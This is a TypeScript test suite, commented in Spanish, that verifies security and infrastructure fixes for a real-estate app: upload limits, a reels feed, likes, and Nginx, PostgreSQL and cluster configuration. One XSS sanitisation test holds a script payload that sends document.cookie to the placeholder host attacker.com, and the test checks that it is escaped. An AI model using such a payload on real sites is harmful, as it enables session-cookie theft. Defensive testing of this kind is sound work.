/**
 * PROPIEDADES PREMIER - AUDITORÍA Y CERTIFICACIÓN DE VULNERABILIDADES RESUELTAS
 * 
 * Verifica que todos los hallazgos de la auditoría técnica estén mitigados:
 * 1. Prevención de Disk DoS y Presigned URLs seguras (Object Storage / MinIO).
 * 2. Feed NoSQL de Videos 9:16 (Reels), likes atómicos y sanitización XSS en comentarios.
 * 3. Configuración de Upstream en Balanceador Nginx.
 * 4. Esquema DDL de PostgreSQL 16 para alta concurrencia MVCC.
 * 5. Arquitectura Multi-Core Cluster en Node.js.
 */

process.env.NODE_ENV = 'test';

import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createApp } from '../server/src/index';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export async function runAuditMitigationTests(): Promise<{ passed: number; failed: number }> {
  console.log('\n╔════════════════════════════════════════════════════════════════════╗');
  console.log('║  VERIFICACIÓN DE MITIGACIÓN DE AUDITORÍA Y CIBERSEGURIDAD 2.0.0    ║');
  console.log('╚════════════════════════════════════════════════════════════════════╝\n');

  let passed = 0;
  let failed = 0;

  async function test(name: string, fn: () => void | Promise<void>) {
    try {
      await fn();
      console.log(`  🛡️ [AUDIT PASS] ${name}`);
      passed++;
    } catch (err: any) {
      console.error(`  ❌ [AUDIT FAIL] ${name}: ${err.message}`);
      failed++;
    }
  }

  const app = createApp();
  const server = app.listen(0);
  const address = server.address() as any;
  const baseUrl = `http://localhost:${address.port}/api/v1`;

  try {
    // --------------------------------------------------------------------------
    // 1. Mitigación de Agotamiento de Disco (Presigned URLs hacia Object Storage)
    // --------------------------------------------------------------------------
    console.log('--- 1. Prevención de DoS por Almacenamiento & Presigned URLs ---');

    await test('Rechaza subida de formatos ejecutables o no permitidos (.exe, .sh, .php)', async () => {
      const res = await fetch(`${baseUrl}/media/presigned-url`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filename: 'exploit.php',
          contentType: 'application/x-php',
          fileSizeBytes: 2048
        })
      });
      assert.strictEqual(res.status, 400);
      const json = await res.json();
      assert.strictEqual(json.success, false);
      assert.ok(json.error === 'VALIDACION_FALLIDA' || json.error === 'TIPO_ARCHIVO_NO_PERMITIDO');
    });

    await test('Rechaza archivos que exceden la cuota estricta (ej. video > 50MB)', async () => {
      const res = await fetch(`${baseUrl}/media/presigned-url`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filename: 'huge_video.mp4',
          contentType: 'video/mp4',
          fileSizeBytes: 60 * 1024 * 1024 // 60 MB
        })
      });
      assert.strictEqual(res.status, 400);
      const json = await res.json();
      assert.strictEqual(json.success, false);
      assert.ok(json.error === 'VALIDACION_FALLIDA' || json.error === 'TAMANO_EXCEDIDO');
    });

    await test('Emite Presigned URL válida para video vertical 9:16 hacia Object Storage', async () => {
      const res = await fetch(`${baseUrl}/media/presigned-url`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filename: 'reel_cumbaya.mp4',
          contentType: 'video/mp4',
          fileSizeBytes: 18 * 1024 * 1024,
          folder: 'reels'
        })
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.success, true);
      assert.ok(json.data.uploadUrl.includes('premier-media'));
      assert.ok(json.data.uploadUrl.includes('signature='));
      assert.strictEqual(json.data.expiresInSeconds, 900);
    });

    // --------------------------------------------------------------------------
    // 2. Microservicio de Red Social (Reels 9:16, Likes Atómicos y Anti-XSS)
    // --------------------------------------------------------------------------
    console.log('\n--- 2. Microservicio NoSQL Red Social (Reels 9:16 & Anti-XSS) ---');

    await test('Feed de reels retorna videos 9:16 con estadísticas de engagement', async () => {
      const res = await fetch(`${baseUrl}/reels?limit=5`);
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.success, true);
      assert.ok(json.data.reels.length >= 3);
      const reel = json.data.reels[0];
      assert.strictEqual(reel.aspectRatio, '9:16');
      assert.ok(reel.stats.viewsCount > 0);
      assert.ok(reel.authorAgent.licenseNumber.length > 0);
    });

    await test('Incremento atómico de like y prevención de duplicados', async () => {
      const resLike1 = await fetch(`${baseUrl}/reels/reel-001/like`, { method: 'POST' });
      assert.strictEqual(resLike1.status, 200);
      const jsonLike1 = await resLike1.json();
      assert.strictEqual(jsonLike1.success, true);
      assert.strictEqual(jsonLike1.data.isLiked, true);

      // Segundo like del mismo usuario remueve el like (toggle)
      const resLike2 = await fetch(`${baseUrl}/reels/reel-001/like`, { method: 'POST' });
      const jsonLike2 = await resLike2.json();
      assert.strictEqual(jsonLike2.data.isLiked, false);
    });

    await test('Sanitización activa contra Cross-Site Scripting (XSS) en comentarios', async () => {
      const maliciousPayload = '<script>window.location="http://attacker.com/steal?c="+document.cookie</script>Excelente vista!';
      const res = await fetch(`${baseUrl}/reels/reel-001/comment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: maliciousPayload })
      });
      assert.strictEqual(res.status, 201);
      const json = await res.json();
      assert.strictEqual(json.success, true);
      // El script malicioso debe haber sido neutralizado a entidades HTML
      assert.ok(!json.data.text.includes('<script>'));
      assert.ok(json.data.text.includes('&lt;script&gt;'));
    });

    await test('Registro de telemetría de retención de video para métricas de agentes', async () => {
      const res = await fetch(`${baseUrl}/reels/reel-001/view`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ durationSeconds: 30 })
      });
      assert.strictEqual(res.status, 200);
      const json = await res.json();
      assert.strictEqual(json.success, true);
    });

    // --------------------------------------------------------------------------
    // 3. Balanceador de Carga Nginx (Configuración Upstream)
    // --------------------------------------------------------------------------
    console.log('\n--- 3. Verificación de Balanceador Nginx Upstream ---');

    await test('Nginx conf contiene bloque upstream premier_backend_cluster con least_conn', () => {
      const nginxConf = fs.readFileSync(path.resolve(__dirname, '../nginx/nginx.conf'), 'utf-8');
      assert.ok(nginxConf.includes('upstream premier_backend_cluster'), 'Bloque upstream premier_backend_cluster presente');
      assert.ok(nginxConf.includes('least_conn;'), 'Algoritmo least_conn configurado');
      assert.ok(nginxConf.includes('keepalive 64;'), 'Keepalive de 64 sockets configurado');
      assert.ok(nginxConf.includes('proxy_next_upstream error timeout http_502 http_503'), 'Tolerancia a fallos configurada');
    });

    // --------------------------------------------------------------------------
    // 4. Esquema PostgreSQL 16 (PostGIS & MVCC)
    // --------------------------------------------------------------------------
    console.log('\n--- 4. Integridad del Esquema PostgreSQL 16 + PostGIS ---');

    await test('Esquema postgresSchema.sql contiene tablas de usuarios, propiedades, GIN e índices espaciales', () => {
      const pgSchema = fs.readFileSync(path.resolve(__dirname, '../server/src/database/postgresSchema.sql'), 'utf-8');
      assert.ok(pgSchema.includes('CREATE TABLE IF NOT EXISTS users'), 'Tabla users presente');
      assert.ok(pgSchema.includes('CREATE TABLE IF NOT EXISTS properties'), 'Tabla properties presente');
      assert.ok(pgSchema.includes('features_json JSONB'), 'JSONB para amenidades presente');
      assert.ok(pgSchema.includes('CREATE INDEX IF NOT EXISTS idx_properties_features ON properties USING GIN'), 'Índice GIN para JSONB');
      assert.ok(pgSchema.includes('lat NUMERIC(10, 7)'), 'Coordenadas de latitud alta precisión');
      assert.ok(pgSchema.includes('lng NUMERIC(10, 7)'), 'Coordenadas de longitud alta precisión');
    });

    // --------------------------------------------------------------------------
    // 5. Arquitectura Multi-Core Cluster en Node.js
    // --------------------------------------------------------------------------
    console.log('\n--- 5. Clúster Multi-Core de Node.js ---');

    await test('Archivo cluster.ts define forking multinúcleo y auto-healing de workers', () => {
      const clusterTs = fs.readFileSync(path.resolve(__dirname, '../server/src/cluster.ts'), 'utf-8');
      assert.ok(clusterTs.includes('cluster.isPrimary'), 'Lógica primaria de clúster presente');
      assert.ok(clusterTs.includes('cluster.fork()'), 'Fork de workers multinúcleo');
      assert.ok(clusterTs.includes('cluster.on(\'exit\''), 'Evento de auto-healing presente');
    });

  } finally {
    server.close();
  }

  console.log('\n======================================================');
  console.log(`📊 RESULTADOS AUDITORÍA MITIGADA: ${passed} pasadas, ${failed} fallidas`);
  console.log('======================================================\n');

  return { passed, failed };
}

// Ejecutar si se invoca directamente
if (process.argv[1] && process.argv[1].includes('audit-security-and-concurrency')) {
  runAuditMitigationTests().catch((e) => {
    console.error('Error general en auditoría:', e);
    process.exit(1);
  });
}
